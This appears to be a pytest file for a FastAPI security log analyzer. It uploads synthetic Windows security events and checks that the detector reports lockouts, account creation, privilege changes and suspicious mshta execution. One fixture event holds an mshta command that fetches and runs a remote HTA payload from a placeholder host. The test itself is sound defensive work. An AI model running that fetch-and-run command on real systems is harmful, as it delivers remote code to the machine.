import json

from fastapi.testclient import TestClient

from main import app


client = TestClient(app)


def test_structured_windows_detection_pack_upload():
    events = [
        {
            "TimeCreated": "2026-08-04T00:01:00Z",
            "Id": 4740,
            "Message": (
                "A user account was locked out. "
                "Account Name: alice "
                "Caller Computer Name: WORKSTATION-7"
            ),
        },
        {
            "TimeCreated": "2026-08-04T00:02:00Z",
            "Id": 4720,
            "Message": (
                "A user account was created. "
                "Account Name: svc_backup"
            ),
        },
        {
            "TimeCreated": "2026-08-04T00:03:00Z",
            "Id": 4732,
            "Message": (
                "A member was added to a security-enabled local group. "
                "Group Name: Administrators "
                "Member Name: CONTOSO\\alice"
            ),
        },
        {
            "TimeCreated": "2026-08-04T00:04:00Z",
            "Id": 4672,
            "Message": (
                "Special privileges assigned to new logon. "
                "Account Name: alice"
            ),
        },
        {
            "TimeCreated": "2026-08-04T00:05:00Z",
            "Id": 4688,
            "Message": (
                "A new process has been created. "
                "New Process Name: "
                "C:\\Windows\\System32\\mshta.exe "
                "Command Line: mshta.exe "
                "https://example.invalid/payload.hta"
            ),
        },
        {
            "TimeCreated": "2026-08-04T00:06:00Z",
            "Id": 4688,
            "Message": (
                "A new process has been created. "
                "New Process Name: "
                "C:\\Windows\\System32\\notepad.exe "
                "Command Line: notepad.exe notes.txt"
            ),
        },
    ]

    response = client.post(
        "/upload",
        files={
            "file": (
                "windows-security-pack.json",
                json.dumps(events).encode("utf-8"),
                "application/json",
            )
        },
    )

    assert response.status_code == 200

    data = response.json()
    finding_types = {
        finding["type"]
        for finding in data["analysis"]["findings"]
    }

    assert data["input_format"] == "json"
    assert data["records_analyzed"] == 6
    assert data["analysis"]["risk_score"] == 100
    assert data["analysis"]["score_before_cap"] == 150

    assert finding_types == {
        "Account Lockout",
        "User Account Created",
        "Privileged Group Membership Change",
        "Special Privileges Assigned",
        "Suspicious Mshta Execution",
    }
